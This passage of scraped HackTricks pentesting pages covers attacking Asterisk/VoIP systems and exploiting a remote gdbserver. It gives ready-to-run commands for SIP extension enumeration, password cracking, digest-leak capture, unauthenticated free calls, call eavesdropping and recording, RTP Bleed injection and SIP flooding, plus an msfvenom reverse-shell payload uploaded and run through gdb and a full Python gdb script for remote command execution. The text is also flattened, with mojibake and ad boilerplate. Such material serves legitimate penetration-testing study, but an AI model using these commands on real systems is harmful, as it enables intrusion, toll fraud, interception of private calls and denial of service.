extensions\n.\nsvwar\n10.10\n.0.10\n-p5060\n-e100-300\n-m\nREGISTER\nsipextend.py\nfrom\nsippts\n:\nSipexten identifies extensions on a SIP server. Sipexten can check large network and port ranges.\npython3 sipexten.py\n-i\n10.10\n.0.10\n-r\n5080\n-e\n100\n-200\nmetasploit\n: You can also enumerate extensions/usernames with metasploit:\nauxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)\nauxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)\nenumiax\n(\napt install enumiax\n): enumIAX\nis an Inter Asterisk Exchange protocol\nusername brute-force enumerator\n. enumIAX may operate in two distinct modes; Sequential Username Guessing or Dictionary Attack.\nenumiax\n-d\n/usr/share/wordlists/metasploit/unix_users.txt\n10.10\n.0.10\n# Use dictionary\nenumiax\n-v\n-m3\n-M3\n10.10\n.0.10\nVoIP Attacks\nPassword Brute-Force\nHaving discovered the\nPBX\nand some\nextensions/usernames\n, a Red Team could try to\nauthenticate via the\nREGISTER\nmethod\nto an extension using a dictionary of common passwords to brute force the authentication.\nNote that a\nusername\ncan be the same as the extension, but this practice may vary depending on the PBX system, its configuration, and the organization's preferences...\nIf the username is not the same as the extension, you will need to\nfigure out the username to brute-force it\n.\nsvcrack\nfrom SIPVicious (\nsudo apt install sipvicious\n): SVCrack allows you to crack the password for a specific username/extension on a PBX.\nsvcrack\n-u100\n-d\ndictionary.txt udp://10.0.0.1:5080\n#Crack known username\nsvcrack\n-u100\n-r1-9999\n-z4\n10.0\n.0.1\n#Check username in extensions\nsipcrack.py\nfrom\nsippts\n:\nSIP Digest Crack is a tool to crack the digest authentications within the SIP protocol.\npython3 siprcrack.py\n-i\n10.10\n.0.10\n-r\n5080\n-e\n100,101\n,103-105\n-w\nwordlist/rockyou.txt\nMetasploit\n:\n‚Äã\nhttps://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb\n‚Äã\n‚Äã\nhttps://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb\n‚Äã\nVoIP Sniffing\nIf you find VoIP equipment inside an\nOpen Wifi network\n, you could\nsniff all the information\n. Moreover, if you are inside a more closed network (connected via Ethernet or protected Wifi) you could perform\nMitM attacks such as\nARPspoofing\nbetween the\nPBX and the gateway\nin order to sniff the information.\nAmong the network information, you could find\nweb credentials\nto manage the equipment, user\nextensions\n,\nusername\n,\nIP\naddresses, even\nhashed passwords\nand\nRTP packets\nthat you could reproduce to\nhear the conversation\n, and more.\nTo get this information you could use tools such as Wireshark, tcpdump... but a\nspecially created tool to sniff VoIP conversations is\nucsniff\n.\nNote that if\nTLS is used in the SIP communication\nyou won't be able to see the SIP communication in clear.\nThe same will happen if\nSRTP\nand\nZRTP\nis used,\nRTP packets won't be in clear text\n.\nSIP credentials\n‚Äã\nCheck this example to understand better a\nSIP REGISTER communication\nto learn how are\ncredentials being sent\n.\nsipdump\n&\nsipcrack\n,\npart of\nsipcrack\n(\napt-get install sipcrack\n): These tools can\nextract\nfrom a\npcap\nthe\ndigest authentications\nwithin the SIP protocol and\nbruteforce\nthem.\nsipdump\n-p\nnet-capture.pcap sip-creds.txt\nsipcrack sip-creds.txt\n-w\ndict.txt\nsiptshar.py\n,\nsipdump.py\n,\nsipcrack.py\nfrom\nsippts\n:\nSipTshark\nextracts data of SIP protocol from a PCAP file.\nSipDump\nExtracts SIP Digest authentications from a PCAP file.\nSIP Digest Crack\nis a tool to crack the digest authentications within the SIP protocol.\npython3 siptshark.py\n-f\ncaptura3.pcap\n[\n-filter auth\n]\npython3 sipdump.py\n-f\ncaptura3.pcap\n-o\ndata.txt\npython3 sipcrack.py\n-f\ndata.txt\n-w\nwordlist/rockyou.txt\nDTMF codes\nNot only SIP credentials\ncan be found in the network traffic, it's also possible to find DTMF codes which are used for example to access the\nvoicemail\n.\nIt's possible to send these codes in\nINFO SIP messages\n, in\naudio\nor inside\nRTP packets\n. If the codes are inside RTP packets, you could cut that part of the conversation and use the tool multimo to extract them:\nmultimon\n-a\nDTMF\n-t\nwac pin.wav\nFree Calls / Asterisks Connections Misconfigurations\nIn Asterisk it's possible to allow a connection\nfrom an specific IP address\nor from\nany IP address\n:\nhost=10.10.10.10\nhost=dynamic\nIf an IP address is specified, the host\nwon't need to send REGISTER\nrequests every once in a while (in the REGISTER packet is sent the time to live, usually 30min, which means that in other scenario the phone will need to REGISTER every 30mins). However, it'll need to have open ports allowing connections from the VoIP server to take calls.\nTo define users they can be defined as:\ntype=user\n: The user can only receive calls as user.\ntype=friend\n: It's possible to perform calls as peer and receive them as user (used with extensions)\ntype=peer\n: It's possible to send and receive calls as peer (SIP-trunks)\nIt's also possible to establish trust with the insecure variable:\ninsecure=port\n: Allows peer connections validated by IP.\ninsecure=invite\n: Doesn't require authentication for INVITE messages\ninsecure=port,invite\n: Both\nWhen\ntype=friend\nis used, the\nvalue\nof the\nhost\nvariable\nwon't be used\n, so if an admin\nmisconfigure a SIP-trunk\nusing that value,\nanyone will be able to connect to it\n.\nFor example, this configuration would be vulnerable:\nhost=10.10.10.10\ninsecure=port,invite\ntype=friend\nFree Calls / Asterisks Context Misconfigurations\nIn Asterisk a\ncontext\nis a named container or section in the dial plan that\ngroups together related extensions, actions, and rules\n. The dial plan is the core component of an Asterisk system, as it defines\nhow incoming and outgoing calls are handled and routed\n. Contexts are used to organize the dial plan, manage access control, and provide separation between different parts of the system.\nEach context is defined in the configuration file, typically in the\nextensions.conf\nfile. Contexts are denoted by square brackets, with the context name enclosed within them. For example:\ncsharpCopy code\n[\nmy_context\n]\nInside the context, you define extensions (patterns of dialed numbers) and associate them with a series of actions or applications. These actions determine how the call is processed. For instance:\n[my_context]\nexten => 100\n,\n1\n,\nAnswer\n()\nexten => 100\n,\nn\n,\nPlayback\n(\nwelcome\n)\nexten => 100\n,\nn\n,\nHangup\n()\nThis example demonstrates a simple context called \"my_context\" with an extension \"100\". When someone dials 100, the call will be answered, a welcome message will be played, and then the call will be terminated.\nThis is\nanother context\nthat allows to\ncall to any other number\n:\n[external]\nexten => _X.\n,\n1\n,\nDial\n(\nSIP/trunk/$\n{\nEXTEN\n})\nIf the admin defines the\ndefault context\nas:\n[default]\ninclude => my_context\ninclude => external\nAnyone will be able to use the\nserver to call to any other number\n(and the admin of the server will pay for the call).\nMoreover, by default the\nsip.conf\nfile contains\nallowguest=true\n, then\nany\nattacker with\nno authentication\nwill be able to call to any other number.\nsipinvite.py\nfrom\nsippts\n:\nSipinvite checks if a\nPBX server allows us to make calls without authentication\n. If the SIP server has an incorrect configuration, it will allow us to make calls to external numbers. It can also allow us to transfer the call to a second external number.\nFor example, if your Asterisk server has a bad context configuration, you can accept INVITE request without authorization. In this case, an attacker can make calls without knowing any user/pass.\n# Trying to make a call to the number 555555555 (without auth) with source number 200.\npython3 sipinvite.py\n-i\n10.10\n.0.10\n-fu\n200\n-tu\n555555555\n-v\n‚Äã\n# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.\npython3 sipinvite.py\n-i\n10.10\n.0.10\n-tu\n555555555\n-t\n444444444\nFree calls / Misconfigured IVRS\nIVRS stands for\nInteractive Voice Response System\n, a telephony technology that allows users to interact with a computerized system through voice or touch-tone inputs. IVRS is used to build\nautomated call handling\nsystems that offer a range of functionalities, such as providing information, routing calls, and capturing user input.\nIVRS in VoIP systems typically consists of:\n1.\nVoice prompts\n: Pre-recorded audio messages that guide users through the IVR menu options and instructions.\n2.\nDTMF\n(Dual-Tone Multi-Frequency) signaling: Touch-tone inputs generated by pressing keys on the phone, which are used to navigate through the IVR menus and provide input.\n3.\nCall routing\n: Directing calls to the appropriate destination, such as specific departments, agents, or extensions based on user input.\n4.\nUser input capture\n: Collecting information from callers, such as account numbers, case IDs, or any other relevant data.\n5.\nIntegration with external systems\n: Connecting the IVR system to databases or other software systems to access or update information, perform actions, or trigger events.\nIn an Asterisk VoIP system, you can create an IVR using the dial plan (\nextensions.conf\nfile) and various applications such as\nBackground()\n,\nPlayback()\n,\nRead()\n, and more. These applications help you play voice prompts, capture user input, and control the call flow.\nExample of vulnerable configuration\nexten => 0\n,\n100\n,\nRead\n(\nnumbers\n,\nthe_call\n,,,,\n5\n)\nexten => 0\n,\n101\n,\nGotoIf\n(\n\"$[${numbers}\"\n=\n\"1\"\n]?200\n)\nexten => 0\n,\n102\n,\nGotoIf\n(\n\"$[${numbers}\"\n=\n\"2\"\n]?300\n)\nexten => 0\n,\n103\n,\nGotoIf\n(\n\"$[${numbers}\"\n=\n\"\"\n]?100\n)\nexten => 0\n,\n104\n,\nDial\n(\nLOCAL/$\n{\nnumbers\n})\nThe previous is a example where the user is asked to\npress 1 to call\na department,\n2 to call\nanother, or\nthe complete extension\nif he knows it.\nThe vulnerability is the fact that the indicated\nextension length is not checked, so a user could input the 5seconds timeout a complete number and it will be called.\nExtension Injection\nUsing a extension such as:\nexten => _X.\n,\n1\n,\nDial\n(\nSIP/$\n{\nEXTEN\n})\nWhere\n${EXTEN}\nis the\nextension\nthat will be called, when the\next 101 is introduced\nthis is what would happen:\nexten => 101\n,\n1\n,\nDial\n(\nSIP/101\n)\nHowever, if\n${EXTEN}\nallows to introduce\nmore than numbers\n(like in older Asterisk versions), an attacker could introduce\n101&SIP123123123\nto call the phone number 123123123. And this would be the result:\nexten => 101&SIP123123123\n,\n1\n,\nDial\n(\nSIP/101&SIP123123123\n)\nTherefore, a call to the extension\n101\nand\n123123123\nwill be send and only the first one getting the call would be stablished... but if an attacker use an\nextension that bypasses any match\nthat is being performed but doesn't exist, he could be\ninject a call only to the desired number\n.\nSIPDigestLeak\nThe SIP Digest Leak is a vulnerability that affects a large number of SIP Phones, including both hardware and software IP Phones as well as phone adapters (VoIP to analogue). The vulnerability allows\nleakage of the Digest authentication response\n, which is computed from the password. An\noffline password attack is then possible\nand can recover most passwords based on the challenge response.\nVulnerability scenario (for\nmore information check this\n):\n1.\nAn IP Phone (victim) is listening on port 5060, accepting phone calls\n2.\nThe attacker sends an INVITE to the IP Phone\n3.\nThe victim phone starts ringing and someone picks up and hangs up (because no one answers the phone at the other end)\n4.\nWhen the phone is hung up, the\nvictim phone sends a BYE to the attacker\n5.\nThe\nattacker issues a 407 response\nthat\nasks for authentication\nand issues an authentication challenge\n6.\nThe\nvictim phone provides a response to the authentication challenge\nin a second BYE\n7.\nThe\nattacker can then issue a brute-force attack\non the challenge response on his local machine (or distributed network etc) and guess the password\nsipdigestleak.py\nfrom\nsippts\n:\nSipDigestLeak exploits this vulnerability.\npython3 sipdigestleak.py\n-i\n10.10\n.0.10\n‚Äã\n[\n!\n]\nTarget:\n10.10\n.0.10:5060/UDP\n[\n!\n]\nCaller:\n100\n[\n!\n]\nCallee:\n100\n‚Äã\n[\n=>\n]\nRequest INVITE\n[\n<=\n]\nResponse\n100\nTrying\n[\n<=\n]\nResponse\n180\nRinging\n[\n<=\n]\nResponse\n200\nOK\n[\n=>\n]\nRequest ACK\n..\n. waiting\nfor\nBYE\n..\n.\n[\n<=\n]\nReceived BYE\n[\n=>\n]\nRequest\n407\nProxy Authentication Required\n[\n<=\n]\nReceived BYE with digest\n[\n=>\n]\nRequest\n200\nOk\n‚Äã\nAuth\n=\nDigest\nusername\n=\n\"pepelux\"\n,\nrealm\n=\n\"asterisk\"\n,\nnonce\n=\n\"lcwnqoz0\"\n,\nuri\n=\n\"sip:\n[email¬†protected]\n:56583;transport=UDP\"\n,\nresponse\n=\n\"31fece0d4ff6fd524c1d4c9482e99bb2\"\n,\nalgorithm\n=\nMD5\nClick2Call\nClick2Call allows a\nweb user\n(who for example might be interested in a product) to\nintroduce\nhis\ntelephone number\nto get called. Then a commercial will be called, and when he\npicks up the phone\nthe user will be\ncalled and connected with the agent\n.\nA common Asterisk profile for this is:\n[web_user]\nsecret = complex_password\ndeny = 0.0.0.0/0.0.0.0\nallow = 0.0.0.0/0.0.0.0\ndisplayconnects = yes\nread = system\n,\ncall\n,\nlog\n,\nverbose\n,\nagent\n,\nuser\n,\nconfig\n,\ndtmf\n,\nreporting\n,\ncrd\n,\ndiapla\nwrite = system\n,\ncall\n,\nagent\n,\nuser\n,\nconfig\n,\ncommand\n,\nreporting\n,\noriginate\nThe previos profile is allowing\nANY IP address to connect\n(if the password is known).\nTo\norganize a call\n, like specified previously,\nno read permissions is necessary\nand\nonly\noriginate\nin\nwrite\nis needed.\nWith those permissions any IP knowing the password could connect and extract too much info, like:\n# Get all the peers\nexec\n3\n<>\n/dev/tcp/10.10.10.10/5038\n&&\necho\n-e\n\"Action: Login\n\\n\nUsername:test\n\\n\nSecret:password\n\\n\nEvents: off\n\\n\\n\nAction:Command\n\\n\nCommand: sip show peers\n\\n\\n\nAction: logoff\n\\n\\n\n\"\n>\n&3\n&&\ncat\n<\n&3\nMore information or actions could be requested.\nEavesdropping\nIn Asterisk it's possible to use the command\nChanSpy\nindicating the\nextension(s) to monitor\n(or all of them) to hear conversations that are happening. This command need to be assigned to an extension.\nFor example,\nexten => 333,1,ChanSpy('all',qb)\nindicate that if you\ncall\nthe\nextension 333\n, it will\nmonitor\nall\nthe extensions,\nstart listening\nwhenever a new conversation start (\nb\n) in quiet mode (\nq\n) as we don't want to interact on it. You could go from one conversation happening to another pressing\n*\n, or marking the extension number.\nIt's also possible tu use\nExtenSpy\nto monitor one extension only.\nInstead of listening the conversations, it's possible to\nrecord them in files\nusing an extension such as:\n[recorded-context]\nexten => _X.\n,\n1\n,\nSet\n(\nNAME=/tmp/$\n{\nCONTEXT\n}\n_$\n{\nEXTEN\n}\n_$\n{\nCALLERID\n(\nnum\n)}\n_$\n{\nUNIQUEID\n}\n.wav\n)\nexten => _X.\n,\n2\n,\nMixMonitor\n(\n$\n{\nNAME\n})\nCalls will be saved in\n/tmp\n.\nYou could also even make Asterisk\nexecute a script that will leak the call\nwhen it's closed.\nexten => h\n,\n1\n,\nSystem\n(\n/tmp/leak_conv.sh &\n)\nRTCPBleed\nRTCPBleed\nis a major security issue affecting Asterisk-based VoIP servers (published in 2017). The vulnerability allows\nRTP (Real Time Protocol) traffic\n, which carries VoIP conversations, to be\nintercepted and redirected by anyone on the Internet\n. This occurs because RTP traffic bypasses authentication when navigating through NAT (Network Address Translation) firewalls.\nRTP proxies try to address\nNAT limitations\naffecting RTC systems by proxying RTP streams between two or more parties. When NAT is in place, the RTP proxy software often cannot rely on the RTP IP and port information retrieved through signalling (e.g. SIP). Therefore, a number of RTP proxies have implemented a mechanism where such\nIP and port tuplet is learned automatically\n. This is often done by by inspecting incoming RTP traffic and marking the source IP and port for any incoming RTP traffic as the one that should be responded to. This mechanism, which may be called \"learning mode\",\ndoes not make use of any sort of authentication\n. Therefore\nattackers\nmay\nsend RTP traffic to the RTP proxy\nand receive the proxied RTP traffic meant to be for the caller or callee of an ongoing RTP stream. We call this vulnerability RTP Bleed because it allows attackers to receive RTP media streams meant to be sent to legitimate users.\nAnother interesting behaviour of RTP proxies and RTP stacks is that sometimes,\neven if not vulnerable to RTP Bleed\n, they will\naccept, forward and/or process RTP packets from any source\n. Therefore attackers can send RTP packets which may allow them to inject their media instead of the legitimate one. We call this attack RTP injection because it allows injection of illegitimate RTP packets into existent RTP streams. This vulnerability may be found in both RTP proxies and endpoints.\nAsterisk and FreePBX have traditionally used the\nNAT=yes\nsetting\n, which enables RTP traffic to bypass authentication, potentially leading to no audio or one-way audio on calls.\nFor more info check\nhttps://www.rtpbleed.com/\n‚Äã\nrtpbleed.py\nfrom\nsippts\n:\nIt detects the RTP Bleed vulnerability sending RTP streams\npython3 rtpbleed.py\n-i\n10.10\n.0.10\nrtcpbleed.py\nfrom\nsippts\n:\nIt detects the RTP Bleed vulnerability sending RTP streams\npython3 rtcpbleed.py\n-i\n10.10\n.0.10\nrtpbleedflood.py\nfrom\nsippts\n:\nExploit the RTP Bleed vulnerability sending RTP streams\npython3 rtpbleedflood.py\n-i\n10.10\n.0.10\n-p\n10070\n-v\nrtpbleedinject.py\nfrom\nsippts\n:\nExploit the RTP Bleed vulnerability sending RTP streams (from an audio file)\npython3 rtpbleedinject.py\n-i\n10.10\n.0.10\n-p\n10070\n-f\naudio.wav\nRCE\nIn Asterisk you somehow manage to be able to\nadd extension rules and reload them\n(for example by compromising a vulnerable web manager server), it's possible to get RCE using the\nSystem\ncommand.\nsame => n\n,\nSystem\n(\necho\n\"Called at $(date)\"\n>> /tmp/call_log.txt\n)\nThere is command called\nShell\nthat could be used\ninstead of\nSystem\nto execute system commands if necessary.\nIf the server is\ndisallowing the use of certain characters\nin the\nSystem\ncommand (like in Elastix), check if the web server allows to\ncreate files somehow inside the system\n(like in Elastix or trixbox), and use it to\ncreate a backdoor script\nand then use\nSystem\nto\nexecute\nthat\nscript\n.\nInteresting local files and permissions\nsip.conf\n-> Contains the password of SIP users.\nIf the\nAsterisk server is running as root\n, you could compromise root\nmysql root user\nmight\ndoesn't have any password\n.\nthis could be used to create a new mysql user as backdoor\nFreePBX\namportal.conf\n-> Contains the password of the web panel administrator (FreePBX)\nFreePBX.conf\n-> Constains the password of the user FreePBXuser used to access the database\nthis could be used to create a new mysql user as backdoor\nElastix\nElastix.conf\n-> Contains several passwords in clear text like mysql root pass, IMAPd pass, web admin pass\nSeveral folders\nwill belong to the compromised asterisk user (if not running as root). This user can read the previous files and also controls the configuration, so he could make Asterisk to load other backdoored binaries when executed.\nRTP Injection\nIt's possible to insert a\n.wav\nin converstions using tools such as\nrtpinsertsound\n(\nsudo apt install rtpinsertsound\n) and\nrtpmixsound\n(\nsudo apt install rtpmixsound\n).\nOr you could use the scripts from\nhttp://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/\nto\nscan conversations\n(\nrtpscan.pl\n), send a\n.wav\nto a conversation (\nrtpsend.pl\n) and\ninsert noise\nin a conversation (\nrtpflood.pl\n).\nDoS\nThere are several ways to try to achieve DoS in VoIP servers.\nsipflood.py\nfrom\nsippts\n: _SipFlood\n_ sends unlimited messages to the target\npython3 sipflood.py -i 10.10.0.10 -r 5080 -m invite -v\n‚Äã\nIAXFlooder\n: DoS IAX protocol used by Asterisk\n‚Äã\ninviteflood\n: A tool to perform SIP/SDP INVITE message flooding over UDP/IP.\n‚Äã\nrtpflood\n: Send several well formed RTP packets. Its needed to know the RTP ports that are being used (sniff first).\n‚Äã\nSIPp\n: Allows to analyze and generate SIP traffic. so it can be used to DoS also.\n‚Äã\nSIPsak\n: SIP swiss army knife. Can also be used to perform SIP attacks.\nFuzzers:\nprotos-sip\n,\nvoiper\n.\nsipsend.py\nfrom\nsippts\n:\nSIPSend allow us to send a\ncustomized SIP message\nand analyze the response.\nwssend.py\nfrom\nsippts\n:\nWsSend allow us to send a customized SIP message over WebSockets and analyze the response.\nOS Vulnerabilities\nThe easiest way to install a software such as Asterisk is to download an\nOS distribution\nthat has it already installed, such as:\nFreePBX, Elastix, Trixbox\n... The problem with those is that once it's working sysadmins might\nnot update them again\nand\nvulnerabilities\nare going to be discovered with time.\nReferences\n‚Äã\nhttps://github.com/Pepelux/sippts/wiki\n‚Äã\n‚Äã\nhttp://blog.pepelux.org/\n‚Äã\n‚Äã\nhttps://www.rtpbleed.com/\n‚Äã\n‚Äã\nhttps://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\nPentesting SAP\nNext\nBasic VoIP Protocols\nLast modified\n2mo ago"
    },
    {
        "title": "Pentesting Remote GdbServer",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver",
        "text": "Pentesting Remote GdbServer\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\nDragonJAR Security Conference es un evento internacional de ciberseguridad\ncon m√°s de una d√©cada que se celebrar√° el 7 y 8 de septiembre de 2023 en Bogot√°, Colombia. Es un evento de gran contenido t√©cnico donde se presentan las √∫ltimas investigaciones en espa√±ol que atrae a hackers e investigadores de todo el mundo.\n¬°Reg√≠strate ahora en el siguiente enlace y no te pierdas esta gran conferencia!:\nCongreso De Hackers - DragonJAR Security Conference - Congreso de Hackers\nCongreso de Hackers\nBasic Information\ngdbserver\nis a computer program that makes it possible to remotely debug other programs. Running on the same system as the program to be debugged, it allows the\nGNU Debugger to connect from another system\n; that is, only the executable to be debugged needs to be resident on the target system (\"target\"), while the source code and a copy of the binary file to be debugged reside on the developer's local computer (\"host\"). The connection can be either TCP or a serial line.\nYou can make a\ngdbserver listen in any port\nand at the moment\nnmap is not capable of recognising the service\n.\nExploitation\nUpload and Execute\nYou can easily create an\nelf backdoor with msfvenom\n, upload it and execute is:\n# Trick shared by @B1n4rySh4d0w\nmsfvenom\n-p\nlinux/x64/shell_reverse_tcp\nLHOST\n=\n10.10\n.10.10\nLPORT\n=\n4444\nPrependFork\n=\ntrue\n-f\nelf\n-o\nbinary.elf\n‚Äã\nchmod\n+x binary.elf\n‚Äã\ngdb binary.elf\n‚Äã\n# Set remote debuger target\ntarget extended-remote\n10.10\n.10.11:1337\n‚Äã\n# Upload elf file\nremote put binary.elf binary.elf\n‚Äã\n# Set remote executable file\nset\nremote exec-file /home/user/binary.elf\n‚Äã\n# Execute reverse shell executable\nrun\n‚Äã\n# You should get your reverse-shell\nExecute arbitrary commands\nThere is another way to\nmake the debugger execute arbitrary commands via a python custom script taken from\nhere\n.\n# Given remote terminal running `gdbserver :2345 ./remote_executable`, we connect to that server.\ntarget extended-remote\n192.168\n.1.4:2345\n‚Äã\n# Load our custom gdb command `rcmd`.\nsource\n./remote-cmd.py\n‚Äã\n# Change to a trusty binary and run it to load it\nset\nremote exec-file /bin/bash\nr\n‚Äã\n# Run until a point where libc has been loaded on the remote process, e.g. start of main().\ntb main\nr\n‚Äã\n# Run the remote command, e.g. `ls`.\nrcmd\nls\nFirst of all\ncreate locally this script\n:\nremote-cmd.py\n#!/usr/bin/env python3\n‚Äã\nimport\ngdb\nimport\nre\nimport\ntraceback\nimport\nuuid\n‚Äã\n‚Äã\nclass\nRemoteCmd\n(\ngdb\n.\nCommand\n):\ndef\n__init__\n(\nself\n):\nself\n.\naddresses\n=\n{}\n‚Äã\nself\n.\ntmp_file\n=\nf'/tmp/\n{\nuuid\n.\nuuid4\n().\nhex\n}\n'\ngdb\n.\nwrite\n(\nf\"Using tmp output file:\n{\nself\n.\ntmp_file\n}\n.\\n\"\n)\n‚Äã\ngdb\n.\nexecute\n(\n\"set detach-on-fork off\"\n)\ngdb\n.\nexecute\n(\n\"set follow-fork-mode parent\"\n)\n‚Äã\ngdb\n.\nexecute\n(\n\"set max-value-size unlimited\"\n)\ngdb\n.\nexecute\n(\n\"set pagination off\"\n)\ngdb\n.\nexecute\n(\n\"set print elements 0\"\n)\ngdb\n.\nexecute\n(\n\"set print repeats 0\"\n)\n‚Äã\nsuper\n(\nRemoteCmd\n,\nself\n).\n__init__\n(\n\"rcmd\"\n,\ngdb\n.\nCOMMAND_USER\n)\n‚Äã\ndef\npreload\n(\nself\n):\nfor\nsymbol\nin\n[\n\"close\"\n,\n\"execl\"\n,\n\"fork\"\n,\n\"free\"\n,\n\"lseek\"\n,\n\"malloc\"\n,\n\"open\"\n,\n\"read\"\n,\n]:\nself\n.\nload\n(\nsymbol\n)\n‚Äã\ndef\nload\n(\nself\n,\nsymbol\n):\nif\nsymbol\nnot\nin\nself\n.\naddresses\n:\naddress_string\n=\ngdb\n.\nexecute\n(\nf\"info address\n{\nsymbol\n}\n\"\n,\nto_string\n=\nTrue\n)\nmatch\n=\nre\n.\nmatch\n(\nf'Symbol \"\n{\nsymbol\n}\n\" is at ([0-9a-fx]+) .*'\n,\naddress_string\n,\nre\n.\nIGNORECASE\n)\nif\nmatch\nand\nlen\n(\nmatch\n.\ngroups\n())\n>\n0\n:\nself\n.\naddresses\n[\nsymbol\n]\n=\nmatch\n.\ngroups\n()[\n0\n]\nelse\n:\nraise\nRuntimeError\n(\nf'Could not retrieve address for symbol \"\n{\nsymbol\n}\n\".'\n)\n‚Äã\nreturn\nself\n.\naddresses\n[\nsymbol\n]\n‚Äã\ndef\noutput\n(\nself\n):\n# From `fcntl-linux.h`\nO_RDONLY\n=\n0\ngdb\n.\nexecute\n(\nf'set $fd = (int)\n{\nself\n.\nload\n(\n\"open\"\n)}\n(\"\n{\nself\n.\ntmp_file\n}\n\",\n{\nO_RDONLY\n}\n)'\n)\n‚Äã\n# From `stdio.h`\nSEEK_SET\n=\n0\nSEEK_END\n=\n2\ngdb\n.\nexecute\n(\nf'set $len = (int)\n{\nself\n.\nload\n(\n\"lseek\"\n)}\n($fd, 0,\n{\nSEEK_END\n}\n)'\n)\ngdb\n.\nexecute\n(\nf'call (int)\n{\nself\n.\nload\n(\n\"lseek\"\n)}\n($fd, 0,\n{\nSEEK_SET\n}\n)'\n)\nif\nint\n(\ngdb\n.\nconvenience_variable\n(\n\"len\"\n))\n<=\n0\n:\ngdb\n.\nwrite\n(\n\"No output was captured.\"\n)\nreturn\n‚Äã\ngdb\n.\nexecute\n(\nf'set $mem = (void*)\n{\nself\n.\nload\n(\n\"malloc\"\n)}\n($len)'\n)\ngdb\n.\nexecute\n(\nf'call (int)\n{\nself\n.\nload\n(\n\"read\"\n)}\n($fd, $mem, $len)'\n)\ngdb\n.\nexecute\n(\n'printf \"%s\\\\n\", (char*) $mem'\n)\n‚Äã\ngdb\n.\nexecute\n(\nf'call (int)\n{\nself\n.\nload\n(\n\"close\"\n)}\n($fd)'\n)\ngdb\n.\nexecute\n(\nf'call (int)\n{\nself\n.\nload\n(\n\"free\"\n)}\n($mem)'\n)\n‚Äã\ndef\ninvoke\n(\nself\n,\narg\n,\nfrom_tty\n):\ntry\n:\nself\n.\npreload\n()\n‚Äã\nis_auto_solib_add\n=\ngdb\n.\nparameter\n(\n\"auto-solib-add\"\n)\ngdb\n.\nexecute\n(\n\"set auto-solib-add off\"\n)\n‚Äã\nparent_inferior\n=\ngdb\n.\nselected_inferior\n()\ngdb\n.\nexecute\n(\nf'set $child_pid = (int)\n{\nself\n.\nload\n(\n\"fork\"\n)}\n()'\n)\nchild_pid\n=\ngdb\n.\nconvenience_variable\n(\n\"child_pid\"\n)\nchild_inferior\n=\nlist\n(\nfilter\n(\nlambda\nx\n:\nx\n.\npid\n==\nchild_pid\n,\ngdb\n.\ninferiors\n())\n)[\n0\n]\ngdb\n.\nexecute\n(\nf\"inferior\n{\nchild_inferior\n.\nnum\n}\n\"\n)\n‚Äã\ntry\n:\ngdb\n.\nexecute\n(\nf'call (int)\n{\nself\n.\nload\n(\n\"execl\"\n)}\n(\"/bin/sh\", \"sh\", \"-c\", \"exec\n{\narg\n}\n>\n{\nself\n.\ntmp_file\n}\n2>&1\", (char*)0)'\n)\nexcept\ngdb\n.\nerror\nas\ne\n:\nif\n(\n\"The program being debugged exited while in a function called from GDB\"\nin\nstr\n(\ne\n)\n):\npass\nelse\n:\nraise\ne\nfinally\n:\ngdb\n.\nexecute\n(\nf\"inferior\n{\nparent_inferior\n.\nnum\n}\n\"\n)\ngdb\n.\nexecute\n(\nf\"remove-inferiors\n{\nchild_inferior\n.\nnum\n}\n\"\n)\n‚Äã\nself\n.\noutput\n()\nexcept\nException\nas\ne\n:\ngdb\n.\nwrite\n(\n\"\"\n.\njoin\n(\ntraceback\n.\nTracebackException\n.\nfrom_exception\n(\ne\n).\nformat\n()))\nraise\ne\nfinally\n:\ngdb\n.\nexecute\n(\nf'set auto-solib-add\n{\n\"on\"\nif\nis_auto_solib_add\nelse\n\"off\"\n}\n'\n)\n‚Äã\n‚Äã\nRemoteCmd\n()\n‚Äã\nDragonJAR Security Conference es un evento internacional de ciberseguridad\ncon m√°s de una d√©cada que se celebrar√° el 7 y 8 de septiembre de 2023 en Bogot√°, Colombia. Es un evento de gran contenido t√©cnico donde se presentan las √∫ltimas investigaciones en espa√±ol que atrae a hackers e investigadores de todo el mundo.\n¬°Reg√≠strate ahora en el siguiente enlace y no te pierdas esta gran conferencia!:\nCongreso De Hackers - DragonJAR Security Conference - Congreso de Hackers\nCongreso de Hackers\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube 